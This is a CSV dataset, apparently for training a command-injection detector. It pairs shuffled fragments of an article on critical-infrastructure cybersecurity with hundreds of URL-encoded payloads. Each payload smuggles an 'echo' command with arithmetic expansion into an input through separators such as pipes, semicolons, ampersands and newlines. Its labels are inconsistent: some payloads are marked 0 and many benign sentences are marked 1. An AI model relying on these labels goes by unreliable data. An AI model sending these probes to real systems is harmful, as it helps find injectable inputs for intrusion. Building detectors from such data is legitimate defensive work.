Sentence,Label
infrastructure has been given plenty of attention.,0
|echo%20ZMCCDQ$((18%2B56))$(echo%20ZMCCDQ)ZMCCDQ//,1
the largest insurance companies in the United States was,0
echo%20AQRKLL$((20%2B31))$(echo%20AQRKLL)AQRKLL%5C%5C,1
echo%20CWRXRJ$((77%2B13))$(echo%20CWRXRJ)CWRXRJ,1
of critical infrastructure has been,0
echo%20GGRVQX$((86%2B56))$(echo%20GGRVQX)GGRVQX//,1
"echo%20DYFBHG$((50%2B7))$(echo%20DYFBHG)DYFBHG""",1
The attack led to a fuel crisis and,0
echo%20DINEVC$((57%2B17))$(echo%20DINEVC)DINEVC//,1
|echo%20YCIXVI$((40%2B81))$(echo%20YCIXVI)YCIXVI&,1
|echo%20VQUOCA$((12%2B35))$(echo%20VQUOCA)VQUOCA',1
This has been driven by a string of notable,0
|echo%20UTCPPJ$((1%2B15))$(echo%20UTCPPJ)UTCPPJ%22,1
|echo%20TWNZDU$((10%2B40))$(echo%20TWNZDU)TWNZDU,1
|echo%20TRMWWT$((44%2B53))$(echo%20TRMWWT)TRMWWT,0
|echo%20SBZVBA$((97%2B74))$(echo%20SBZVBA)SBZVBA//,1
|echo%20RAKMKS$((5%2B89))$(echo%20RAKMKS)RAKMKS%27,1
"|echo%20PRCGGO$((57%2B79))$(echo%20PRCGGO)PRCGGO""",0
|echo%20PAKNUK$((48%2B25))$(echo%20PAKNUK)PAKNUK%26,1
|echo%20OYDZIJ$((96%2B61))$(echo%20OYDZIJ)OYDZIJ\,1
|echo%20OTDXSU$((6%2B1))$(echo%20OTDXSU)OTDXSU%5C%5C,1
The alert turns attention to the fragility of yet,1
|echo%20OTDJOE$((4%2B21))$(echo%20OTDJOE)OTDJOE|,1
|echo%20NUZDZT$((76%2B71))$(echo%20NUZDZT)NUZDZT|,0
another critical infrastructure sector.,1
|echo%20LTTDYL$((1%2B42))$(echo%20LTTDYL)LTTDYL\,1
|echo%20LRGWPW$((14%2B39))$(echo%20LRGWPW)LRGWPW%5C%5C,0
|echo%20GRWCHE$((81%2B54))$(echo%20GRWCHE)GRWCHE%2F%2F,1
|echo%20GEPPDW$((55%2B58))$(echo%20GEPPDW)GEPPDW%22,1
targeting water and wastewater facilities.,1
|echo%20FZLTEJ$((27%2B72))$(echo%20FZLTEJ)FZLTEJ%7C,1
|echo%20FNYPPK$((77%2B83))$(echo%20FNYPPK)FNYPPK&,0
connected services and outdated operating systems and software,1
These activities include exploits of internet,1
|echo%20DZPIWA$((18%2B47))$(echo%20DZPIWA)DZPIWA%27,0
|echo%20DDLJJW$((33%2B23))$(echo%20DDLJJW)DDLJJW',0
|echo%20CTNHMN$((74%2B58))$(echo%20CTNHMN)CTNHMN,1
"|echo%20CKJBUZ$((1%2B22))$(echo%20CKJBUZ)CKJBUZ""",1
||echo%20ZZJQZV$((83%2B59))$(echo%20ZZJQZV)ZZJQZV//,1
||echo%20ZLPJPQ$((81%2B32))$(echo%20ZLPJPQ)ZLPJPQ%7C,1
||echo%20XNZLSA$((34%2B75))$(echo%20XNZLSA)XNZLSA//,1
||echo%20XIYAUA$((17%2B90))$(echo%20XIYAUA)XIYAUA',1
||echo%20VAYJRW$((6%2B1))$(echo%20VAYJRW)VAYJRW\,1
||echo%20TPIMPW$((11%2B13))$(echo%20TPIMPW)TPIMPW,1
||echo%20TOWNYH$((45%2B79))$(echo%20TOWNYH)TOWNYH,1
||echo%20SJZFWV$((8%2B68))$(echo%20SJZFWV)SJZFWV%27,1
It warns of ongoing malicious cyberactivity,1
||echo%20SGXVWY$((48%2B78))$(echo%20SGXVWY)SGXVWY%27,1
"||echo%20RWZHCR$((74%2B28))$(echo%20RWZHCR)RWZHCR""",0
"First, many of our most critical systems are ",1
||echo%20RFRIIL$((68%2B10))$(echo%20RFRIIL)RFRIIL|,1
||echo%20QPBCIU$((74%2B42))$(echo%20QPBCIU)QPBCIU',0
||echo%20PJBTDO$((60%2B74))$(echo%20PJBTDO)PJBTDO\,1
||echo%20OZJGZU$((76%2B56))$(echo%20OZJGZU)OZJGZU%2F%2F,1
the infrastructure today is far from secure.,1
This is due to a many interrelated factors,1
The need for combating cyberthreats to critical,0
that create a perfect storm of exposures.,0
||echo%20NRVZFD$((41%2B1))$(echo%20NRVZFD)NRVZFD&,0
||echo%20LAPJJF$((87%2B11))$(echo%20LAPJJF)LAPJJF|,0
||echo%20KFLFGL$((10%2B4))$(echo%20KFLFGL)KFLFGL%5C%5C,1
"infrastructure is well recognized. However,",1
||echo%20JQACJR$((33%2B35))$(echo%20JQACJR)JQACJR,1
||echo%20IHELYG$((76%2B62))$(echo%20IHELYG)IHELYG%26,0
"||echo%20GPBEGV$((20%2B34))$(echo%20GPBEGV)GPBEGV""",1
increasing as the number of devices and,1
"Second, many of these systems involve a mix of insecure, ",1
%7Cecho%20RHSIRJ$((85%2B6))$(echo%20RHSIRJ)RHSIRJ%5C%5C,0
%7Cecho%20SEIDBX$((80%2B51))$(echo%20SEIDBX)SEIDBX&,0
connections in these systems continues to grow.,1
%7C%7Cecho%20YHTZHZ$((60%2B82))$(echo%20YHTZHZ)YHTZHZ',1
%7C%7Cecho%20XVNYDY$((93%2B18))$(echo%20XVNYDY)XVNYDY%2F%2F,0
%7C%7Cecho%20UBHYQD$((55%2B41))$(echo%20UBHYQD)UBHYQD%5C%5C,1
%7C%7Cecho%20TVKSTF$((99%2B96))$(echo%20TVKSTF)TVKSTF&,1
even a computer model. This makes it,1
extremely complex. This complexity is rapidly,1
"%7C%7Cecho%20QSKTXK$((24%2B37))$(echo%20QSKTXK)QSKTXK""",0
%7C%7Cecho%20SBQJMU$((91%2B44))$(echo%20SBQJMU)SBQJMU//,0
%7C%7Cecho%20SLVMKV$((96%2B0))$(echo%20SLVMKV)SLVMKV&,1
%7C%7Cecho%20TEDJVC$((96%2B45))$(echo%20TEDJVC)TEDJVC%22,1
"However, they are sometimes connected and ",1
%7C%7Cecho%20PROWNM$((55%2B15))$(echo%20PROWNM)PROWNM,1
%7C%7Cecho%20OYGMVZ$((16%2B56))$(echo%20OYGMVZ)OYGMVZ%26,0
%7C%7Cecho%20NEBEJR$((3%2B38))$(echo%20NEBEJR)NEBEJR%5C%5C,1
%7C%7Cecho%20KRCSNE$((57%2B75))$(echo%20KRCSNE)KRCSNE,1
These new technologies promise features like,1
%7Cecho%20QNJYVT$((4%2B44))$(echo%20QNJYVT)QNJYVT%5C%5C,1
%7Cecho%20SUHDBU$((66%2B15))$(echo%20SUHDBU)SUHDBU,0
advanced analytics and automation.,1
"%7Cecho%20YPOSVR$((24%2B62))$(echo%20YPOSVR)YPOSVR""",1
%7Cecho%20WUSBMH$((6%2B46))$(echo%20WUSBMH)WUSBMH%22,0
%7Cecho%20WEBPND$((27%2B55))$(echo%20WEBPND)WEBPND\,1
designers of the legacy systems could not have imagined.,1
%7Cecho%20VDZSYZ$((58%2B1))$(echo%20VDZSYZ)VDZSYZ',1
"%7Cecho%20UJMTRL$((89%2B70))$(echo%20UJMTRL)UJMTRL""",0
%7Cecho%20UFFOUX$((59%2B47))$(echo%20UFFOUX)UFFOUX|,1
%7Cecho%20TOTSLG$((60%2B1))$(echo%20TOTSLG)TOTSLG,1
outdated legacy systems and new technologies.,1
%7Cecho%20ORHNZL$((45%2B63))$(echo%20ORHNZL)ORHNZL%22,1
%7Cecho%20LPCJMS$((42%2B26))$(echo%20LPCJMS)LPCJMS,0
%7Cecho%20LLYIHD$((46%2B68))$(echo%20LLYIHD)LLYIHD%26,1
%7Cecho%20LLJKNH$((3%2B88))$(echo%20LLJKNH)LLJKNH//,1
%7Cecho%20KIELDL$((12%2B2))$(echo%20KIELDL)KIELDL%27,1
used in insecure ways that the original,1
very difficult to identify weak spots that if exploited,1
%7Cecho%20KAJAPA$((75%2B48))$(echo%20KAJAPA)KAJAPA\,0
%7Cecho%20IRODNG$((26%2B68))$(echo%20IRODNG)IRODNG,0
"Taken together, these factors mean that ",1
%7Cecho%20DPZHUT$((28%2B81))$(echo%20DPZHUT)DPZHUT%7C,1
%7Cecho%20DPUJIL$((23%2B45))$(echo%20DPUJIL)DPUJIL|,0
%7Cecho%20CPQTYB$((64%2B20))$(echo%20CPQTYB)CPQTYB%27,1
%7Cecho%20CGYJPN$((45%2B35))$(echo%20CGYJPN)CGYJPN%2F%2F,1
%7Cecho%20CFOPSJ$((27%2B97))$(echo%20CFOPSJ)CFOPSJ',1
these systems are too complex to be completely,1
"understood by a person, a team of people or ",1
%7Cecho%20AGUYET$((89%2B40))$(echo%20AGUYET)AGUYET//,0
%7C%7Cecho%20ZJAXER$((49%2B60))$(echo%20ZJAXER)ZJAXER%22,0
%7C%7Cecho%20JJSSJL$((99%2B38))$(echo%20JJSSJL)JJSSJL\,1
%7C%7Cecho%20HYHREQ$((78%2B11))$(echo%20HYHREQ)HYHREQ',1
"Carleton University, we are developing solutions to ",1
%7C%7Cecho%20HKTMWP$((40%2B9))$(echo%20HKTMWP)HKTMWP\,1
%7C%7Cecho%20FFBSEF$((15%2B13))$(echo%20FFBSEF)FFBSEF%7C,0
%7C%7Cecho%20FEGCUU$((21%2B29))$(echo%20FEGCUU)FEGCUU,1
%7C%7Cecho%20EBGHXU$((74%2B4))$(echo%20EBGHXU)EBGHXU%27,1
%7C%7Cecho%20DVAMSG$((74%2B5))$(echo%20DVAMSG)DVAMSG,1
%7C%7Cecho%20CXXXGW$((34%2B53))$(echo%20CXXXGW)CXXXGW|,1
address the fragility of critical infrastructure.,1
The complexities of critical infrastructure can lead to,1
"%7C%7Cecho%20CFGBVN$((38%2B88))$(echo%20CFGBVN)CFGBVN""",0
%7C%7Cecho%20BHFQIY$((13%2B3))$(echo%20BHFQIY)BHFQIY|,0
%7C%7Cecho%20AXSULH$((48%2B60))$(echo%20AXSULH)AXSULH%27,1
%3Becho%20YORHEJ$((41%2B36))$(echo%20YORHEJ)YORHEJ%7C,1
%3Becho%20WIJQLD$((58%2B39))$(echo%20WIJQLD)WIJQLD%22,1
%3Becho%20VUJCMW$((70%2B75))$(echo%20VUJCMW)VUJCMW,1
%3Becho%20URYBVY$((71%2B95))$(echo%20URYBVY)URYBVY',1
%3Becho%20UFYCCQ$((51%2B2))$(echo%20UFYCCQ)UFYCCQ&,1
%3Becho%20SVKHMK$((30%2B19))$(echo%20SVKHMK)SVKHMK//,1
%3Becho%20SVFHGU$((48%2B4))$(echo%20SVFHGU)SVFHGU%2F%2F,1
%3Becho%20SRPJET$((29%2B34))$(echo%20SRPJET)SRPJET,1
%3Becho%20RHJGKQ$((38%2B71))$(echo%20RHJGKQ)RHJGKQ,1
%3Becho%20RDKWWC$((22%2B44))$(echo%20RDKWWC)RDKWWC',1
"%3Becho%20QXBWJP$((56%2B78))$(echo%20QXBWJP)QXBWJP""",1
The goal is to improve security and resilience of these important systems.,1
unexpected or unplanned interactions among system components,1
%3Becho%20QHDGWH$((99%2B66))$(echo%20QHDGWH)QHDGWH%27,0
%3Becho%20QGKSLY$((79%2B94))$(echo%20QGKSLY)QGKSLY|,0
%3Becho%20PSHEAA$((43%2B12))$(echo%20PSHEAA)PSHEAA|,1
%3Becho%20OHYLGW$((56%2B18))$(echo%20OHYLGW)OHYLGW%5C%5C,1
"For example, implicit interactions can ",1
%3Becho%20OFIKGO$((60%2B50))$(echo%20OFIKGO)OFIKGO\,1
enable system components to interact in,0
"%3Becho%20MAQCNL$((34%2B31))$(echo%20MAQCNL)MAQCNL""",1
%3Becho%20LMKOMS$((85%2B51))$(echo%20LMKOMS)LMKOMS,0
%3Becho%20LIHHVF$((18%2B45))$(echo%20LIHHVF)LIHHVF//,1
that can allow attackers to damage or disrupt the system and its operations.,1
This leads to unpredictable system behaviours,1
of a system and its operations.,0
%3Becho%20LBKHXK$((90%2B74))$(echo%20LBKHXK)LBKHXK%22,0
%3Becho%20JPRQKB$((93%2B89))$(echo%20JPRQKB)JPRQKB%5C%5C,0
%3Becho%20HQBNCX$((10%2B83))$(echo%20HQBNCX)HQBNCX\,1
unintended and often undesirable ways.,1
%3Becho%20HKYEGB$((78%2B19))$(echo%20HKYEGB)HKYEGB%27,1
%3Becho%20HGVPJY$((28%2B49))$(echo%20HGVPJY)HGVPJY&,0
%3Becho%20FAHQNN$((39%2B84))$(echo%20FAHQNN)FAHQNN%26,1
%26echo%20ZPAVCI$((24%2B53))$(echo%20ZPAVCI)ZPAVCI//,1
"%26echo%20YYWLTQ$((61%2B71))$(echo%20YYWLTQ)YYWLTQ""",1
%26echo%20YRIYND$((40%2B81))$(echo%20YRIYND)YRIYND%27,1
Exploitation of implicit interactions has the,1
"potential to impact the safety, security and reliability ",1
%26echo%20YPFSZA$((90%2B71))$(echo%20YPFSZA)YPFSZA|,0
"%26echo%20YBINSK$((62%2B49))$(echo%20YBINSK)YBINSK""",0
%26echo%20XIZQEH$((78%2B28))$(echo%20XIZQEH)XIZQEH,1
%26echo%20WOTYOT$((32%2B39))$(echo%20WOTYOT)WOTYOT%27,1
%26echo%20VOANQN$((77%2B86))$(echo%20VOANQN)VOANQN',1
%26echo%20VDQUYJ$((41%2B46))$(echo%20VDQUYJ)VDQUYJ//,1
%26echo%20UCANNA$((30%2B68))$(echo%20UCANNA)UCANNA|,1
%26echo%20SDBGBI$((27%2B20))$(echo%20SDBGBI)SDBGBI',1
%26echo%20RKCZIL$((79%2B92))$(echo%20RKCZIL)RKCZIL\,1
%26echo%20RDICIX$((99%2B44))$(echo%20RDICIX)RDICIX%26,1
%26echo%20PXNVTZ$((92%2B1))$(echo%20PXNVTZ)PXNVTZ%22,1
%26echo%20OXZPGU$((40%2B61))$(echo%20OXZPGU)OXZPGU%2F%2F,1
%26echo%20NQPWBV$((16%2B77))$(echo%20NQPWBV)NQPWBV,1
%26echo%20NKMKNI$((64%2B82))$(echo%20NKMKNI)NKMKNI%5C%5C,1
%26echo%20NFGINK$((64%2B92))$(echo%20NFGINK)NFGINK%5C%5C,1
%26echo%20MUQJWT$((7%2B78))$(echo%20MUQJWT)MUQJWT,1
%26echo%20MHEMLM$((72%2B41))$(echo%20MHEMLM)MHEMLM%7C,1
%26echo%20JUIBAU$((1%2B74))$(echo%20JUIBAU)JUIBAU&,1
%26echo%20JPCWXJ$((42%2B48))$(echo%20JPCWXJ)JPCWXJ,1
%26echo%20JOADAU$((32%2B46))$(echo%20JOADAU)JOADAU%22,1
%26echo%20FWAUTF$((39%2B22))$(echo%20FWAUTF)FWAUTF&,1
%26echo%20BRROSL$((24%2B11))$(echo%20BRROSL)BRROSL\,1
%26%26echo%20ZWVYHU$((11%2B21))$(echo%20ZWVYHU)ZWVYHU|,1
%26%26echo%20ZTWRSM$((30%2B32))$(echo%20ZTWRSM)ZTWRSM%26,1
"%26%26echo%20YBQKFD$((48%2B31))$(echo%20YBQKFD)YBQKFD""",1
"%26%26echo%20XKFEGJ$((1%2B49))$(echo%20XKFEGJ)XKFEGJ""",1
%26%26echo%20WLJUON$((15%2B95))$(echo%20WLJUON)WLJUON\,1
%26%26echo%20SWZBKK$((94%2B84))$(echo%20SWZBKK)SWZBKK%27,1
%26%26echo%20QOZRFB$((19%2B4))$(echo%20QOZRFB)QOZRFB,1
%26%26echo%20PUUCTR$((68%2B33))$(echo%20PUUCTR)PUUCTR%2F%2F,1
%26%26echo%20PMWJRH$((60%2B59))$(echo%20PMWJRH)PMWJRH%5C%5C,1
%26%26echo%20MXMWUR$((62%2B86))$(echo%20MXMWUR)MXMWUR//,1
%26%26echo%20KHAVOV$((90%2B77))$(echo%20KHAVOV)KHAVOV,1
%26%26echo%20IKUKJX$((80%2B89))$(echo%20IKUKJX)IKUKJX\,1
%26%26echo%20FFQWQY$((35%2B58))$(echo%20FFQWQY)FFQWQY%7C,1
%26%26echo%20EXUMZL$((4%2B99))$(echo%20EXUMZL)EXUMZL',1
%26%26echo%20EKWZHX$((96%2B4))$(echo%20EKWZHX)EKWZHX//,1
%26%26echo%20EJACRB$((30%2B66))$(echo%20EJACRB)EJACRB%5C%5C,1
%26%26echo%20DNDLZD$((92%2B6))$(echo%20DNDLZD)DNDLZD%22,1
%26%26echo%20DDHYJG$((44%2B11))$(echo%20DDHYJG)DDHYJG%22,1
%26%26echo%20CSSQPT$((9%2B40))$(echo%20CSSQPT)CSSQPT%27,1
%26%26echo%20CMXOJB$((29%2B98))$(echo%20CMXOJB)CMXOJB',1
%26%26echo%20BSQKBM$((74%2B49))$(echo%20BSQKBM)BSQKBM&,1
%26%26echo%20BMIIJQ$((29%2B3))$(echo%20BMIIJQ)BMIIJQ&,1
%26%26echo%20BHDDGG$((67%2B94))$(echo%20BHDDGG)BHDDGG|,1
%26%26echo%20ATQDYD$((66%2B7))$(echo%20ATQDYD)ATQDYD,1
%26%26echo%20AKFLIE$((27%2B64))$(echo%20AKFLIE)AKFLIE,1
%20echo%20YPQTYX$((9%2B27))$(echo%20YPQTYX)YPQTYX&,1
%20echo%20YEOGLL$((28%2B5))$(echo%20YEOGLL)YEOGLL%7C,1
%20echo%20WWHRDZ$((5%2B86))$(echo%20WWHRDZ)WWHRDZ//,1
%20echo%20UXKTUC$((59%2B25))$(echo%20UXKTUC)UXKTUC%5C%5C,1
%20echo%20TWTKKJ$((67%2B81))$(echo%20TWTKKJ)TWTKKJ%26,1
%20echo%20RGMCLI$((27%2B75))$(echo%20RGMCLI)RGMCLI%2F%2F,1
%20echo%20QQZCOQ$((29%2B94))$(echo%20QQZCOQ)QQZCOQ\,1
%20echo%20PPRCPS$((95%2B69))$(echo%20PPRCPS)PPRCPS%2F%2F,1
%20echo%20MJNNEW$((18%2B53))$(echo%20MJNNEW)MJNNEW,1
%20echo%20KSLOZF$((6%2B29))$(echo%20KSLOZF)KSLOZF,1
%20echo%20JFTFZW$((33%2B39))$(echo%20JFTFZW)JFTFZW&,1
"%20echo%20JADUEG$((82%2B93))$(echo%20JADUEG)JADUEG""",1
%20echo%20IBQHOS$((92%2B76))$(echo%20IBQHOS)IBQHOS,1
%20echo%20HNOLCQ$((85%2B27))$(echo%20HNOLCQ)HNOLCQ|,1
%20echo%20HBUFGZ$((85%2B26))$(echo%20HBUFGZ)HBUFGZ%22,1
%20echo%20HBFEEM$((46%2B2))$(echo%20HBFEEM)HBFEEM',1
%20echo%20FPVLKT$((63%2B87))$(echo%20FPVLKT)FPVLKT%22,1
%20echo%20DRFYNB$((7%2B97))$(echo%20DRFYNB)DRFYNB|,1
%20echo%20DCFSTX$((93%2B73))$(echo%20DCFSTX)DCFSTX%27,1
%20echo%20CKFAYE$((18%2B45))$(echo%20CKFAYE)CKFAYE%5C%5C,1
%20echo%20CFTYMJ$((83%2B12))$(echo%20CFTYMJ)CFTYMJ',1
%20echo%20BYBKHF$((87%2B41))$(echo%20BYBKHF)BYBKHF\,1
%20echo%20BSYIFX$((64%2B71))$(echo%20BSYIFX)BSYIFX//,1
"%20echo%20BAJXZZ$((73%2B7))$(echo%20BAJXZZ)BAJXZZ""",1
%20echo%20ALRHIH$((11%2B27))$(echo%20ALRHIH)ALRHIH%27,1
%0aecho%20ZNOLCP$((67%2B83))$(echo%20ZNOLCP)ZNOLCP|,1
%0aecho%20WIRUWF$((87%2B88))$(echo%20WIRUWF)WIRUWF//,1
%0aecho%20VVIEOJ$((30%2B78))$(echo%20VVIEOJ)VVIEOJ,1
%0aecho%20VKWHEH$((83%2B36))$(echo%20VKWHEH)VKWHEH',1
%0aecho%20URBCMK$((17%2B54))$(echo%20URBCMK)URBCMK%27,1
"%0aecho%20SZLYQY$((17%2B3))$(echo%20SZLYQY)SZLYQY""",1
%0aecho%20QUHONN$((15%2B27))$(echo%20QUHONN)QUHONN%7C,1
%0aecho%20PPSKOS$((66%2B51))$(echo%20PPSKOS)PPSKOS%27,1
%0aecho%20PETUUK$((81%2B85))$(echo%20PETUUK)PETUUK%22,1
"%0aecho%20NCRQQT$((66%2B95))$(echo%20NCRQQT)NCRQQT""",1
%0aecho%20MGXPRT$((51%2B4))$(echo%20MGXPRT)MGXPRT&,1
%0aecho%20MESJOF$((62%2B27))$(echo%20MESJOF)MESJOF//,1
%0aecho%20MBVQWK$((48%2B90))$(echo%20MBVQWK)MBVQWK,1
%0aecho%20MAOXEM$((48%2B53))$(echo%20MAOXEM)MAOXEM|,1
%0aecho%20KYMBVZ$((7%2B62))$(echo%20KYMBVZ)KYMBVZ%2F%2F,1
%0aecho%20JXLHHG$((94%2B73))$(echo%20JXLHHG)JXLHHG%26,1
%0aecho%20IMHMUF$((78%2B85))$(echo%20IMHMUF)IMHMUF%5C%5C,1
%0aecho%20ICLECP$((72%2B88))$(echo%20ICLECP)ICLECP,1
%0aecho%20HNTZSH$((50%2B30))$(echo%20HNTZSH)HNTZSH&,1
%0aecho%20HNNUGD$((25%2B95))$(echo%20HNNUGD)HNNUGD\,1
%0aecho%20GGGPWE$((90%2B87))$(echo%20GGGPWE)GGGPWE%22,1
%0aecho%20EIOCXK$((27%2B80))$(echo%20EIOCXK)EIOCXK,1
%0aecho%20BTIFJC$((66%2B80))$(echo%20BTIFJC)BTIFJC',1
%0aecho%20BMHVJK$((19%2B30))$(echo%20BMHVJK)BMHVJK\,1
%0aecho%20ANSTBN$((20%2B35))$(echo%20ANSTBN)ANSTBN%5C%5C,1
&echo%20YHCAGI$((22%2B26))$(echo%20YHCAGI)YHCAGI%27,1
&echo%20XYOEXK$((74%2B11))$(echo%20XYOEXK)XYOEXK&,1
"&echo%20WQLTXV$((0%2B25))$(echo%20WQLTXV)WQLTXV""",1
&echo%20WHEUEX$((35%2B4))$(echo%20WHEUEX)WHEUEX\,1
&echo%20SPRAWO$((58%2B5))$(echo%20SPRAWO)SPRAWO|,1
&echo%20RJCCAT$((53%2B34))$(echo%20RJCCAT)RJCCAT%22,1
&echo%20QLUITC$((73%2B99))$(echo%20QLUITC)QLUITC//,1
&echo%20QLFUON$((35%2B62))$(echo%20QLFUON)QLFUON%22,1
&echo%20QFGFEP$((28%2B72))$(echo%20QFGFEP)QFGFEP%5C%5C,1
&echo%20OSJJGL$((20%2B68))$(echo%20OSJJGL)OSJJGL%7C,1
&echo%20NOKSUR$((8%2B35))$(echo%20NOKSUR)NOKSUR%5C%5C,1
&echo%20MCEEEZ$((59%2B2))$(echo%20MCEEEZ)MCEEEZ\,1
&echo%20LTTPNV$((10%2B90))$(echo%20LTTPNV)LTTPNV%27,1
&echo%20KUCRVN$((73%2B39))$(echo%20KUCRVN)KUCRVN&,1
&echo%20JFDHZU$((1%2B12))$(echo%20JFDHZU)JFDHZU%26,1
&echo%20FXSADU$((58%2B85))$(echo%20FXSADU)FXSADU%2F%2F,1
&echo%20ELYXQO$((59%2B10))$(echo%20ELYXQO)ELYXQO|,1
&echo%20EBREVB$((48%2B67))$(echo%20EBREVB)EBREVB,1
&echo%20DRUCFI$((69%2B56))$(echo%20DRUCFI)DRUCFI,1
&echo%20DACXMN$((57%2B35))$(echo%20DACXMN)DACXMN',1
&echo%20COKQPG$((93%2B87))$(echo%20COKQPG)COKQPG',1
&echo%20CLYXGN$((72%2B81))$(echo%20CLYXGN)CLYXGN,1
&echo%20CCYVIF$((50%2B63))$(echo%20CCYVIF)CCYVIF%2F%2F,1
&echo%20BRXZKX$((10%2B84))$(echo%20BRXZKX)BRXZKX//,1
"&echo%20AGXFEH$((96%2B88))$(echo%20AGXFEH)AGXFEH""",1
&&echo%20ZJEXPP$((7%2B99))$(echo%20ZJEXPP)ZJEXPP,1
&&echo%20XWGNWJ$((33%2B16))$(echo%20XWGNWJ)XWGNWJ%5C%5C,1
&&echo%20XOCEJG$((66%2B21))$(echo%20XOCEJG)XOCEJG%27,1
&&echo%20WZZOUT$((83%2B36))$(echo%20WZZOUT)WZZOUT\,1
&&echo%20TWQKFP$((48%2B69))$(echo%20TWQKFP)TWQKFP',1
&&echo%20TWKYHE$((0%2B57))$(echo%20TWKYHE)TWKYHE|,1
&&echo%20SXUJKT$((94%2B38))$(echo%20SXUJKT)SXUJKT%22,1
&&echo%20SKRKXO$((18%2B5))$(echo%20SKRKXO)SKRKXO//,1
&&echo%20RLCXAD$((4%2B93))$(echo%20RLCXAD)RLCXAD%2F%2F,1
&&echo%20RIWFAA$((64%2B99))$(echo%20RIWFAA)RIWFAA//,1
&&echo%20QZXLOK$((2%2B27))$(echo%20QZXLOK)QZXLOK%27,1
"&&echo%20QTDSQL$((20%2B35))$(echo%20QTDSQL)QTDSQL""",1
&&echo%20QAGWEJ$((84%2B54))$(echo%20QAGWEJ)QAGWEJ&,1
&&echo%20PVJXOS$((12%2B1))$(echo%20PVJXOS)PVJXOS,1
&&echo%20MKGYYL$((46%2B31))$(echo%20MKGYYL)MKGYYL%5C%5C,1
&&echo%20LOAKXY$((52%2B22))$(echo%20LOAKXY)LOAKXY%26,1
&&echo%20KYOISY$((63%2B3))$(echo%20KYOISY)KYOISY,1
&&echo%20KXTSXC$((16%2B52))$(echo%20KXTSXC)KXTSXC%7C,1
&&echo%20HVTWDK$((44%2B47))$(echo%20HVTWDK)HVTWDK&,1
&&echo%20HETHMD$((47%2B99))$(echo%20HETHMD)HETHMD\,1
&&echo%20GKEMGA$((51%2B90))$(echo%20GKEMGA)GKEMGA|,1
&&echo%20FOJNEL$((64%2B8))$(echo%20FOJNEL)FOJNEL,1
&&echo%20CMMOTV$((30%2B10))$(echo%20CMMOTV)CMMOTV',1
"&&echo%20BSQSGI$((11%2B44))$(echo%20BSQSGI)BSQSGI""",1
